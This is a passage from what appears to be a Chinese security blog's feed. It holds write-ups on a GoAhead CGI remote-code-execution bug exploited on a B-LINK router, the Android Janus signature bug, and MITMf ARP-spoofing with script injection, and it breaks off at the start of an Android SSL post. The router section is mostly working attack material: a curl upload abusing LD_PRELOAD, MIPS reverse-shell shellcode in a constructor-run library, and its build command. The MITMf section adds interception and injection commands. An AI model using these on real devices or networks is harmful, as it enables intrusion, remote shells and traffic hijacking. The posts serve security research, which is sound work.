<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137816099569.jpg" alt=""></p>
<p>随后，该函数又将子进程标准输入输出指定到了一个临时文件，而这个临时文件是由post请求的数据部分初始化的，最后launchCgi函数使用从http请求中得到的参数和标准输入输出创建了cgi脚本进程。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137816744632.jpg" alt=""></p>
<p>查看goahead的elf header可以得到其interp段依赖链接器“/lib64/ld-linux-x86-64.so.2”，动态链接器是在链接过程中最先运行的代码，它用来加载目标程序的共享库和符号表。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137935699186.jpg" alt=""></p>
<p>在链接器链接过程中会根据环境变量的值进行不同的操作，其中LD_PRELOAD变量可以指定一个共享库列表，链接器会优先加载此列表中共享库。<br>如果我们在http请求中指定LD_PRELOAD环境变量，此变量将被当作启动cgi脚本的参数传递给链接器，从而可以在cgi脚本启动之前执行任意.so文件，由于post请求中的数据被保存到/tmp文件夹中的一个临时文件中，而launchCgi函数又将cgi脚本的标准输入输出指定到了该临时文件，因此我们可以远程向目标写入一个.so文件，并将LD_PRELOAD指定为“/proc/self/fd/0”来间接引用post请求数据创建的临时文件，从而在目标系统上执行任意代码。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="调试设备"><a href="#调试设备" class="headerlink" title="调试设备"></a>调试设备</h3><p>为了验证该漏洞的真实危害性，找了B-LINK的一款路由器来做测试，首先通过路由器上的UART串口，进入路由器的调试窗口。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/IMG_2461.jpg" alt="IMG_2461"></p>
<p>查看web server 是否 goahead 并且有cgi程序。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/debug.jpg" alt="debug"></p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>有四个cgi文件，找到一个能使用的upload_settings.cgi(需要登陆）</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137864957443.jpg" alt=""></p>
<p>此路由器的系统为 mipsel，原作者没有给出mips小端格式的测试so，使用mipsel交叉编译Buildroot编译一个</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">pentest<span class="variable">@ubuntu</span><span class="symbol">:~/buildroot</span><span class="variable">$ </span>cat   mipsel-hw.c</div><div class="line"><span class="comment">#include &lt;unistd.h&gt;</span></div><div class="line"></div><div class="line">static void before_main(void) __attribute_<span class="number">_</span>((constructor));</div><div class="line"></div><div class="line">static void before_main(void)</div><div class="line">&#123;</div><div class="line">    write(<span class="number">1</span>, <span class="string">"Hello: World!\n"</span>, <span class="number">14</span>);</div><div class="line">&#125;</div><div class="line">pentest<span class="variable">@ubuntu</span><span class="symbol">:~/buildroot</span><span class="variable">$ </span>./mipsel-linux-gcc -shared -fPIC  mipsel-hw.c -o mipsel-hw.so</div><div class="line">pentest<span class="variable">@ubuntu</span><span class="symbol">:~/buildroot</span><span class="variable">$ </span>file mipsel-hw.so</div><div class="line">mipsel-hw.<span class="symbol">so:</span> ELF <span class="number">32</span>-bit LSB shared object, MIPS, MIPS32 version <span class="number">1</span> (SYSV), dynamically linked, <span class="keyword">not</span> stripped</div></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -X POST   -b  <span class="string">"user=admin;platform=0"</span>  --data-binary <span class="meta">@payloads</span><span class="regexp">/mipsel-hw.so   http:/</span><span class="regexp">/192.168.16.1/</span>cgi-bin<span class="regexp">/upload_settings.cgi?LD_PRELOAD=/</span>proc<span class="regexp">/self/</span>fd/<span class="number">0</span> -i</div></pre></td></tr></table></figure>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137866081821.jpg" alt=""></p>
<p>回显成功，说明漏洞存在。</p>
<h3 id="生成-payload"><a href="#生成-payload" class="headerlink" title="生成 payload"></a>生成 payload</h3><p>使用routesplite 生成一个mipsel 下的reverse_tcp shellcode 。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137880896364.jpg" alt=""></p>
<p>写入动态链接库中</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">unsigned char sc[] = &#123;</div><div class="line">    "<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>04<span class="symbol">\x</span>28<span class="symbol">\x</span>a6<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>11<span class="symbol">\x</span>11<span class="symbol">\x</span>04"</div><div class="line">    "<span class="symbol">\x</span>28<span class="symbol">\x</span>a6<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>fd<span class="symbol">\x</span>ff<span class="symbol">\x</span>0c<span class="symbol">\x</span>24<span class="symbol">\x</span>27<span class="symbol">\x</span>20"</div><div class="line">    "<span class="symbol">\x</span>80<span class="symbol">\x</span>01<span class="symbol">\x</span>a6<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>fd<span class="symbol">\x</span>ff<span class="symbol">\x</span>0c<span class="symbol">\x</span>24<span class="symbol">\x</span>27"</div><div class="line">    "<span class="symbol">\x</span>20<span class="symbol">\x</span>80<span class="symbol">\x</span>01<span class="symbol">\x</span>27<span class="symbol">\x</span>28<span class="symbol">\x</span>80<span class="symbol">\x</span>01<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>06<span class="symbol">\x</span>28<span class="symbol">\x</span>57<span class="symbol">\x</span>10<span class="symbol">\x</span>02<span class="symbol">\x</span>24"</div><div class="line">    "<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>44<span class="symbol">\x</span>30<span class="symbol">\x</span>c9<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09"</div><div class="line">    "<span class="symbol">\x</span>01<span class="symbol">\x</span>c9<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>15<span class="symbol">\x</span>b3<span class="symbol">\x</span>05<span class="symbol">\x</span>3c<span class="symbol">\x</span>02<span class="symbol">\x</span>00"</div><div class="line">    "<span class="symbol">\x</span>a5<span class="symbol">\x</span>34<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>af<span class="symbol">\x</span>10<span class="symbol">\x</span>67<span class="symbol">\x</span>05<span class="symbol">\x</span>3c<span class="symbol">\x</span>c0<span class="symbol">\x</span>a8<span class="symbol">\x</span>a5<span class="symbol">\x</span>34<span class="symbol">\x</span>fc"</div><div class="line">    "<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>af<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>23<span class="symbol">\x</span>ef<span class="symbol">\x</span>ff<span class="symbol">\x</span>0c<span class="symbol">\x</span>24<span class="symbol">\x</span>27<span class="symbol">\x</span>30<span class="symbol">\x</span>80<span class="symbol">\x</span>01"</div><div class="line">    "<span class="symbol">\x</span>4a<span class="symbol">\x</span>10<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>08<span class="symbol">\x</span>3c<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>08"</div><div class="line">    "<span class="symbol">\x</span>35<span class="symbol">\x</span>ec<span class="symbol">\x</span>ff<span class="symbol">\x</span>a8<span class="symbol">\x</span>af<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>08<span class="symbol">\x</span>3c<span class="symbol">\x</span>6e<span class="symbol">\x</span>2f<span class="symbol">\x</span>08<span class="symbol">\x</span>35<span class="symbol">\x</span>f0<span class="symbol">\x</span>ff"</div><div class="line">    "<span class="symbol">\x</span>a8<span class="symbol">\x</span>af<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>07<span class="symbol">\x</span>28<span class="symbol">\x</span>f4<span class="symbol">\x</span>ff<span class="symbol">\x</span>a7<span class="symbol">\x</span>af<span class="symbol">\x</span>fc<span class="symbol">\x</span>ff<span class="symbol">\x</span>a7<span class="symbol">\x</span>af<span class="symbol">\x</span>ec"</div><div class="line">    "<span class="symbol">\x</span>ff<span class="symbol">\x</span>a4<span class="symbol">\x</span>23<span class="symbol">\x</span>ec<span class="symbol">\x</span>ff<span class="symbol">\x</span>a8<span class="symbol">\x</span>23<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a8<span class="symbol">\x</span>af<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>23"</div><div class="line">    "<span class="symbol">\x</span>ec<span class="symbol">\x</span>ff<span class="symbol">\x</span>bd<span class="symbol">\x</span>27<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>06<span class="symbol">\x</span>28<span class="symbol">\x</span>ab<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09"</div><div class="line">    "<span class="symbol">\x</span>01"</div><div class="line">&#125;;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">static void before_main(void) __attribute__((constructor));</div><div class="line"></div><div class="line">static void before_main(void)</div><div class="line">&#123;</div><div class="line">    void(*s)(void);</div><div class="line">    s = sc;</div><div class="line">    s();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Buildroot编译</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./mipsel-linux-gcc -shared -fPIC mipsel-<span class="built_in">reverse</span>-tcp.<span class="built_in">c</span> -o mipsel-<span class="built_in">reverse</span>-tcp.so</div></pre></td></tr></table></figure>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>本地 nc 监听 5555 端口，把生成的so文件post到目标</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -X POST   -b  <span class="string">"user=admin;platform=0"</span>  --data-binary <span class="meta">@payloads</span><span class="regexp">/mipsel-reverse-tcp.so   http:/</span><span class="regexp">/192.168.16.1/</span>cgi-bin<span class="regexp">/upload_settings.cgi?LD_PRELOAD=/</span>proc<span class="regexp">/self/</span>fd/<span class="number">0</span></div></pre></td></tr></table></figure>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137897078140.jpg" alt=""></p>
<p>成功反弹shell<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/15137898902411.jpg" alt=""></p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol>
<li>在挖掘IOT设备应用层漏洞时，也需要去关注系统组件的安全。</li>
<li>如果goahead 的cgi 程序无需登录可以访问，可以直接配合csrf 打内网。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li>Remote LD_PRELOAD Exploitation   <a href="https://www.elttam.com.au/blog/goahead" rel="external nofollow noopener noreferrer" target="_blank">https://www.elttam.com.au/blog/goahead</a></li>
<li>routesplite  <a href="https://github.com/reverse-shell/routersploit" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/reverse-shell/routersploit</a></li>
<li>硬件调试  <a href="http://future-sec.com/iot-security-hardware-debuging.html" rel="external nofollow noopener noreferrer" target="_blank">http://future-sec.com/iot-security-hardware-debuging.html</a></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="goahead" scheme="http://www.future-sec.com/tags/goahead/"/>
    
  </entry>
  
  <entry>
    <title>Janus漏洞(CVE-2017-13156)分析</title>
    <link href="http://www.future-sec.com/Janus-CVE-2017-13156-analysis.html"/>
    <id>http://www.future-sec.com/Janus-CVE-2017-13156-analysis.html</id>
    <published>2017-12-20T16:00:00.000Z</published>
    <updated>2018-06-29T08:59:10.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签名，是没有办法安装到系统中的。Android通过数字签名来标识应用程序的作者和在应用程序之间建立信任关系，不是用来决定最终用户可以安装哪些应用程序。这个数字签名由应用程序的作者完成，并不需要权威的数字证书签名机构认证，它只是用来让应用程序包自我认证的。然而Google在本月4日发布的Android安全公告中编号为CVE-2017-13156，这个漏洞被称为Janus漏洞，利用该漏洞可修改app而不影响原始签名。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Android-app签名校验简单介绍"><a href="#Android-app签名校验简单介绍" class="headerlink" title="Android app签名校验简单介绍"></a>Android app签名校验简单介绍</h3><p>在Android源码中“frameworks/base/core/java/android/content/pm/PackageParser.java”中。PackageParser类的collectCertificates方法会对APK进行签名校验，并且遍历APK中的所有文件，对每个文件进行校验。下面是该方法的源码：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image002.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image004.jpg" alt="img"><br>APK是一个ZIP格式的文件，因此使用ZIP相关的类进行读写。在上面代码中调用了loadCertificates，这个方法会返回一个二维数组，当APK中的文件签名校验失败，loadCertificates方法会返回一个空数组（可能是null，可能是数组长度为0），那么依照上面代码的逻辑如果数组为空则会抛出异常。<br>loadCertificates方法的代码见下：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image006.jpg" alt="img"><br>其中is是JarFile.JarFileInputStream类的对象。loadCertificates调用了readFullyIgnoringContents，在readFullyIgnoringContents中会调用JarFile.JarFileInputStream.read（JarFile类在“libcore/luni/src/main/java/java/util/jar/JarFile.java”文件中）<br>读取APK中一项数据，在read方法中会校验读取到的数据项的签名，如果签名校验失败，则会抛出SecurityException类型的异常，即签名校验失败。<br>上面代码调用了StrictJarFile.getCertificateChains方法，在/ libcore / luni / src / main / java / java / util / jar / StrictJarFile.java里面。下面是它的代码：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image007.jpg" alt="img"><br>上面的isSigned在下面的代码里面获取的：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image009.jpg" alt="img"><br>当证书读取成功，而且APK经过了签名，isSigned为true。<br>回到StrictJarFile.getCertificateChains中，当isSigned为true时会调用JarVerifier.getCertificateChains方法，下面是它的代码：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image010.jpg" alt="img"><br>verifiedEntries的声明：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image012.jpg" alt="img"><br>verifiedEntries是一个键值对，键是APK中经过了签名的文件名，如：classes.dex文件，值是证书数组。如果向已经签过名的APK中新添加一个文件然后安装这个APK，当程序逻辑执行到JarVerifier.getCertificateChains中时，在verifiedEntries里面无法找到新添加的文件名（因为这个新文件是在APK签名之后添加），那么JarVerifier.getCertificateChains方法将返回null。<br>以上就是整个对于app签名的简单分析。</p>
<h3 id="签名方案"><a href="#签名方案" class="headerlink" title="签名方案"></a>签名方案</h3><p>参考google官方文档获得:<br>APK 签名方案<br>Android 支持两种应用签名方案，一种是基于 JAR 签名的方案（v1 方案），另一种是 Android Nougat (Android 7.0) 中引入的 APK 签名方案 v2（v2 方案）。<br>JAR 签名（v1 方案）<br>v1 签名并非保护整个apk文件，例如 ZIP 元数据就不受保护。再者，APK 验证程序需要处理大量不可信（尚未经过验证）的数据结构，而不受签名保护的数据不在处理的行列中。这会导致相当大的受攻击面。此外，APK 验证程序必须解压所有已压缩的条目，而这需要花费更多时间和内存。为了解决这些问题，Android 7.0 中引入了 APK 签名方案 v2。<br>APK 签名方案 v2（v2 方案）<br>Android 7.0 中引入了 APK 签名方案 v2（v2 方案）。该方案会对 APK 的内容进行hash处理和签名，然后将生成的“APK 签名分块”插入到 APK 中。<br>在验证期间，v2 方案会将 APK 文件视为 Blob，并对整个文件进行签名检查。对 APK 进行的任何修改（包括对 ZIP 元数据进行的修改）都会使 APK 签名作废。这种形式的 APK 验证不仅速度要快得多，而且能够发现更多种未经授权的修改。<br>同时，新的签名格式向后兼容，使用这种新格式签名的 APK（必须也使用v1） 可在更低版本的 Android 设备上进行安装（会直接忽略添加到 APK 的额外数据）。</p>
<h3 id="apk签名校验方式"><a href="#apk签名校验方式" class="headerlink" title="apk签名校验方式"></a>apk签名校验方式</h3><p>为了提高兼容性，应同时采用 v1 和 v2 这两种方案对应用进行签名。与只使用v1 方案签名的应用相比，经过 v2 方案签名的应用能够更快速地安装到 Android Nougat 以及更高版本的设备上。但是更低版本的 Android 平台会忽略 v2 签名，这就需要应用包含 v1 签名。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image014.jpg" alt="img"><br>验证程序会对照存储在“APK 签名分块”中的 v2 签名对 APK 的全文件hash进行验证。该hash涵盖除“APK 签名分块”（其中包含 v2 签名）之外的所有内容。在“APK 签名分块”以外对 APK 进行的任何修改都会使 APK 的 v2 签名作废。v2 签名被删除的 APK 也会被拒绝，因为 v1 签名指明相应 APK 带有 v2 签名，所以 Android Nougat 及更高版本会拒绝使用 v1 签名验证 APK。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Janus漏洞主要是向APK里面添加额外的DEX文件。一方面，APK文件是zip文件，可以包含初始时的任意字节，在它的zip条目（实际情况下更多是在zip条目里面）。但是JAR签名方案只考虑了zip入口。当计算或者校验apk的签名的时候，它忽略了其他字节。另一方面，在字符串、类、方法定义等常规部分之后，一个DEX文件可以包含任意的字节。综上所述，一个文件可以同时包含一个APK文件和一个DEX文件。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image016.jpg" alt="img"><br>另一个关键点是Dalvik / ART虚拟机方面。android运行加载APK文件，提取它的DEX文件，然后运行它的代码。在实践中，虚拟机可以加载和执行APK文件。当它得到APK文件时，它仍然会查看header的magic字节来判断它是什么类型的文件，如果找到一个DEX类型的，就会将文件载入为DEX文件，否则就会将文件加载为一个APK文件，其中包括一个带有DEX的zip文件。因此，既可以读取DEX文件又可以读取APK文件。<br>所以攻击者可以利用着这种二元性，在不影响其签名的情况下将一个恶意DEX文件预先添加到APK文件里面，然后，android运行时接受APK文件作为一个合法的早期版本的应用程序的有效更新，但是Dalvik虚拟机从注入的DEX文件中加载代码，从而实现攻击。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image018.jpg" alt="img"><br>原来的apk主要代码<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image019.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image021.jpg" alt="img"><br>修改了dex文件，将Log.i(“janus”,”点击事件”);修改为Toast.makeText(getApplicationContext(),”I steal your car.”,Toast.LENGTH_LONG).show();<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image023.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image024.jpg" alt="img"><br>安装合并好的1.apk<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image026.jpg" alt="img"><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image027.jpg" alt="img"><br>测试<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic2/image029.jpg" alt="img"><br>攻击完成</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>该漏洞仅影响基于 JAR 签名的方案（v1 方案）。不影响自Android 7.0 以来引入的 APK 签名方案 v2（v2 方案）。</p>
<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>可被添加恶意dex文件可以进行一些敏感性的操作，例如窃取用户数据、监控手机等高危操作。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://source.android.com/security/apksigning/v2#verification" rel="external nofollow noopener noreferrer" target="_blank">https://source.android.com/security/apksigning/v2#verification</a><br><a href="https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures" rel="external nofollow noopener noreferrer" target="_blank">https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签
    
    </summary>
    
      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="移动安全" scheme="http://www.future-sec.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
      <category term="app签名" scheme="http://www.future-sec.com/tags/app%E7%AD%BE%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>使用MITMF中间人攻击非80端口的HTTP</title>
    <link href="http://www.future-sec.com/using-MITMF-attack-not-80-port-http.html"/>
    <id>http://www.future-sec.com/using-MITMF-attack-not-80-port-http.html</id>
    <published>2017-12-20T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:10.244Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。<br>例如注入一段js</p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">sudo </span> <span class="string">python </span><span class="string">mitmf.</span><span class="string">py </span> -i <span class="string">wlan0 </span><span class="built_in">--spoof</span> <span class="built_in">--arp</span> <span class="built_in">--target</span>  <span class="string">172.</span><span class="string">18.</span><span class="string">219.</span>3 <span class="built_in">--gateway</span>  <span class="string">172.</span><span class="string">18.</span><span class="string">219.</span>1  <span class="built_in">--inject</span> <span class="built_in">--html-payload</span> <span class="string">'&lt;script&gt;alert(0)&lt;/script&gt;'</span></div></pre></td></tr></table></figure>
<p>victim 访问<br><a href="http://yaseng.org/project" rel="external nofollow noopener noreferrer" target="_blank">http://yaseng.org/project</a></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129397954576.jpg" alt=""></p>
<p>访问非80端口的http web<br><a href="http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml" rel="external nofollow noopener noreferrer" target="_blank">http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml</a><br>无任何提示  </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129398489571.jpg" alt=""></p>
<p>attack 端</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot35.jpg" alt="img"></p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>简单看了一下代码<br>MITMf/core/utils.py   line:84</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">def HTTP(self, http_redir_port):</div><div class="line">    <span class="built_in">log</span>.<span class="built_in">debug</span>(<span class="string">"Setting iptables HTTP redirection rule from port 80 to &#123;&#125;"</span>.<span class="built_in">format</span>(http_redir_port))</div><div class="line">    <span class="built_in">os</span>.system(<span class="string">'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &#123;&#125;'</span>.<span class="built_in">format</span>(http_redir_port))</div></pre></td></tr></table></figure>
<p>iptables 把80端口的mitmf 监听的10000端口，很显然，需要劫持哪个端口，加一条规则就行了。<br>例如 </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo  iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port  10000</div></pre></td></tr></table></figure>
<p>attack</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/Screenshot36.jpg" alt="mg"><br>victim<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/15129405294732.jpg" alt=""></p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>使用mitmf 来绕过HSTS站点抓取登陆明文  <a href="http://yaseng.org/hsts-bypass-with-mitmf.html" rel="external nofollow noopener noreferrer" target="_blank">http://yaseng.org/hsts-bypass-with-mitmf.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h2&gt;&lt;p&gt;MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。&lt;/p&gt;
&lt;h2 id=&quot;问题&quot;&gt;&lt;a hre
    
    </summary>
    
      <category term="web安全" scheme="http://www.future-sec.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://www.future-sec.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="MITMf" scheme="http://www.future-sec.com/tags/MITMf/"/>
    
  </entry>
  
  <entry>
    <title>你在互联网上的数据还在裸奔吗？</title>
    <link href="http://www.future-sec.com/android-ssl-security.html"/>
    <id>http://www.future-sec.com/android-ssl-security.html</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:12.637Z</updated>
    
    <content type="html"><![CDATA[<p>这是今年三月份有关移动市场的统计数据,移动app的数量已经突破10亿。移动安全也成为了一个全民关注的问题。从最初的app只针对功能实现，爆出来了一系列的高危漏洞之后，应运而生了包括移动app检测、app加固保护等工作来保护开发者以及使用者权益。同时，http的明文数据传输问题也得到了有效解决。我们本篇文章的讨论内容还是从数据传输过程中所引发的一系列安全问题。 <img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-fu/20170418102254459.jpg" alt="img"></p>
